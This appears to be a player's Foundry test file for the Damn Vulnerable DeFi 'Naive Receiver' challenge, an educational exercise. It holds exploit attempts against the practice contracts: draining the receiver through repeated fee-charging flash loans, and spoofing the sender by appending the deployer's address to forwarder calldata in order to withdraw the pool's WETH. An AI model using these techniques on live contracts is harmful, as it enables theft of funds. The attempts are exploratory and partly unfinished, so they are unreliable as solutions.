// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
            address(forwarder),
            payable(weth),
            deployer
        );

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_drain_receiver() public {
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        while (weth.balanceOf(address(receiver)) > 0) {
            pool.flashLoan(receiver, address(weth), 1, "");
        }

        assertEq(weth.balanceOf(address(receiver)), 0);
        console.log("receiver drained", weth.balanceOf(address(pool)));
    }

    function test_investigate() public view {
        console.log("Player address:", player);
        console.log("deployer address:", deployer);
        console.log("Player deposits:", pool.deposits(player));
        console.log("Player deployer:", pool.deposits(deployer));
    }

    function testMulticallFlashLoans() public {
        // Prepare multiple flashLoan calls
        // bytes[] memory calls = new bytes[](10); // Let's do 10 flash loans
        // for (uint256 i = 0; i < 10; i++) {
        //     calls[i] = abi.encodeWithSelector(
        //         pool.flashLoan.selector,
        //         address(receiver),
        //         address(weth),
        //         1, // Borrow 1 wei each time
        //         ""
        //     );
        // }
        // // Execute multicall
        // vm.prank(player);
        // pool.multicall(calls);

        vm.startPrank(player);
        vm.deal(player, 1000);
        bytes[] memory calls = new bytes[](10); // Let's do 10 flash loans
        for (uint256 i = 0; i < 10; i++) {
            calls[i] = abi.encodeWithSelector(pool.deposit.selector, "");
        }
        // Execute multicall
        console.log("td before", pool.totalDeposits());
        pool.deposit{value: 1000}();
        pool.multicall(calls);
        console.log("td after", pool.totalDeposits());
        // check pool balance
        console.log(weth.balanceOf(address(pool)));

        vm.stopPrank();
    }

    function test_steal() public {
        console.log("Player address:", player);
        console.log("deployer address:", deployer);
        console.log("Player before balance:", weth.balanceOf(player));
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: address(pool), // Checked
            target: address(pool),
            value: 0, // Checked
            gas: 1000000,
            nonce: 0, // ???
            data: abi.encodePacked(
                abi.encodeWithSignature(
                    "withdraw(uint256,address)",
                    weth.balanceOf(address(pool)),
                    payable(player)
                ),
                deployer // Append deployer's address instead of player's
            ),
            deadline: block.timestamp + 1000
        });

        bytes32 requestHash = forwarder.getDataHash(request);

        bytes32 domainSeparator = forwarder.domainSeparator();

        bytes32 typedDataHash = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, requestHash)
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, typedDataHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        address recoveredSigner = ECDSA.recover(typedDataHash, signature);
        console.log("Recovered signer:", recoveredSigner);
        console.log("Expected signer (player):", player);

        forwarder.execute(request, signature);
        console.log("Player address After:", weth.balanceOf(player));
    }

    // ---- EDs Tests ----
    //https://solidity-by-example.org/abi-encode/
    modifier test_forwarder_deposit() {
        uint256 depositAmount = 1 ether;

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: depositAmount,
            gas: 1000000,
            nonce: 0,
            data: abi.encodeWithSelector(pool.deposit.selector),
            deadline: block.timestamp + 1000
        });

        bytes memory signature = signature_helper(request);

        vm.startPrank(player);
        vm.deal(player, depositAmount);
        forwarder.execute{value: depositAmount}(request, signature);

        // Verify the deposit was successful
        assertEq(pool.deposits(player), depositAmount);
        assertEq(pool.totalDeposits(), WETH_IN_POOL + depositAmount);
        vm.stopPrank();
        _;
    }

    function test_forwarder_withdraw() public test_forwarder_deposit {
        uint256 withdrawAmount = 1 ether;

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 1000000,
            nonce: 1,
            data: abi.encodeWithSelector(
                pool.withdraw.selector,
                withdrawAmount,
                payable(player)
            ),
            deadline: block.timestamp + 1000
        });

        bytes memory signature = signature_helper(request);

        vm.startPrank(player);
        forwarder.execute(request, signature);

        // Verify the withdraw was successful
        assertEq(pool.deposits(player), 0);
        assertEq(pool.totalDeposits(), WETH_IN_POOL);
        vm.stopPrank();
    }

    function test_forwarder_flashLoan() public test_forwarder_deposit {
        uint256 FIXED_FEE = 1e18;
        uint256 flashLoanAmount = 1 ether;
        uint256 initialPoolBalance = weth.balanceOf(address(pool));
        uint256 initialReceiverBalance = weth.balanceOf(address(receiver));
        uint256 initialFeeReceiverDeposit = pool.deposits(pool.feeReceiver());

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 1000000,
            nonce: 1,
            data: abi.encodeWithSelector(
                pool.flashLoan.selector,
                address(receiver),
                address(weth),
                flashLoanAmount,
                ""
            ),
            deadline: block.timestamp + 1000
        });

        bytes memory signature = signature_helper(request);

        vm.startPrank(player);
        forwarder.execute(request, signature);

        // Verify the flash loan was successful
        assertEq(
            weth.balanceOf(address(pool)),
            initialPoolBalance + FIXED_FEE,
            "Pool balance should increase by the fee amount"
        );
        assertEq(
            weth.balanceOf(address(receiver)),
            initialReceiverBalance - FIXED_FEE,
            "Receiver balance should decrease by the fee amount"
        );
        assertEq(
            pool.deposits(pool.feeReceiver()),
            initialFeeReceiverDeposit + FIXED_FEE,
            "Fee receiver deposit should increase by the fee amount"
        );
        assertEq(
            pool.totalDeposits(),
            initialPoolBalance + FIXED_FEE,
            "Total deposits should increase by the fee amount"
        );

        vm.stopPrank();
    }

    function test_forwarder_multicall_withdraw() public test_forwarder_deposit {
        uint256 withdrawAmount = uint256(1 ether) / 3; // Withdraw 1/3 of the deposit each time
        uint256 remaineder = uint256(1 ether) - withdrawAmount * 3;
        console.log("remaineder:", remaineder);
        console.log("withdrawAmount:", withdrawAmount);
        //.333333333333333333
        console.log("players deposits", pool.deposits(player));
        // Prepare multicall data for three withdrawals
        bytes[] memory multicallData = new bytes[](3);
        for (uint256 i = 0; i < 3; i++) {
            multicallData[i] = abi.encodeWithSelector(
                pool.withdraw.selector,
                withdrawAmount,
                payable(player)
            );
        }

        // Encode the multicall function call
        bytes memory multicallEncoded = abi.encodeWithSelector(
            pool.multicall.selector,
            multicallData
        );

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 3000000, // Increase gas limit for multiple operations
            nonce: 1,
            data: multicallEncoded,
            deadline: block.timestamp + 1000
        });

        bytes memory signature = signature_helper(request);

        vm.startPrank(player);
        forwarder.execute(request, signature);
        console.log("players deposits", pool.deposits(player));

        // Verify the withdrawals were successful
        assertEq(pool.deposits(player), remaineder);
        //assertEq(pool.totalDeposits(), WETH_IN_POOL);
        assertEq(weth.balanceOf(player), 1 ether - remaineder); // Player should have received all their deposited WETH back
        vm.stopPrank();
    }

    function signature_helper(
        BasicForwarder.Request memory request
    ) public view returns (bytes memory) {
        bytes32 requestHash = forwarder.getDataHash(request);

        bytes32 domainSeparator = forwarder.domainSeparator();

        bytes32 typedDataHash = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, requestHash)
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, typedDataHash);
        return abi.encodePacked(r, s, v);
    }

    function test_assertInitialState() public {
        // Check initial balances
        //NaiveReceiverPool
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        //FlashLoanReceiver
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        //NaiveReceiverPool
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        pool.flashLoan(receiver, address(weth), WETH_IN_RECEIVER, "");
    }

    function test_works() public {
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool), // Changed to pool address
            value: 0,
            gas: 1000000,
            nonce: 0,
            data: abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver), // The flash loan receiver
                address(weth), // The token (WETH)
                WETH_IN_RECEIVER, // The amount to borrow
                "" // Additional data (empty in this case)
            ),
            deadline: block.timestamp + 1000
        });

        bytes32 requestHash = forwarder.getDataHash(request);

        bytes32 domainSeparator = forwarder.domainSeparator();
        bytes32 typedDataHash = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, requestHash)
        );
        console.logBytes32(typedDataHash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, typedDataHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        address recoveredSigner = ECDSA.recover(typedDataHash, signature);
        console.log("Recovered signer:", recoveredSigner);
        console.log("Expected signer (player):", player);

        forwarder.execute(request, signature);
    }

    function test_fwder_old() public {
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool), // Changed to pool address
            value: 0,
            gas: 1000000,
            nonce: 0,
            data: abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver), // The flash loan receiver
                address(weth), // The token (WETH)
                WETH_IN_RECEIVER, // The amount to borrow
                "" // Additional data (empty in this case)
            ),
            deadline: block.timestamp + 1000
        });

        bytes32 requestHash = forwarder.getDataHash(request);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );

        // Pool is empty too
        assertEq(
            weth.balanceOf(address(pool)),
            0,
            "Unexpected balance in pool"
        );

        // All funds sent to recovery account
        assertEq(
            weth.balanceOf(recovery),
            WETH_IN_POOL + WETH_IN_RECEIVER,
            "Not enough WETH in recovery account"
        );
    }
}
